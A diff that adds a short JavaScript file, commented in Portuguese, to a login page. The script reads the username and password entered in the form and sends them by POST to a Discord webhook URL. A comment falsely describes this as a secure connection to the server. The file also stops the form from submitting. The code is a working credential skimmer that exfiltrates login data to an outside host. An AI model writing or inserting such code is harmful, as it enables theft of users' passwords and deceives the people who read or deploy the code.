@@ -1,0 +1,25 @@
+// Obtenha a entrada de usuário e senha do formulário
+const username = document.querySelector('input[name="username"]').value;
+const password = document.querySelector('input[name="password"]').value;
+
+// Crie uma conexão com o servidor de forma segura
+fetch('https://discord.com/api/webhooks/1573500610710601778/M92sTTydO6gH-b6VN-SPYIhyvSBWhoTvioU9QQOwa2enmhS7OnHowiw9cFq085a3F15V', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+  },
+  body: JSON.stringify({
+    username,
+    password,
+  }),
+  credentials: 'include',
+  redirect: true,
+})
+.then((response) => response.json())
+.then((data) => console.log(data))
+.catch((error) => console.error(error));
+
+// Previna a submissão do formulário
+document.getElementById('demoLogin').addEventListener('submit', function(event) {
+  event.preventDefault();
+});
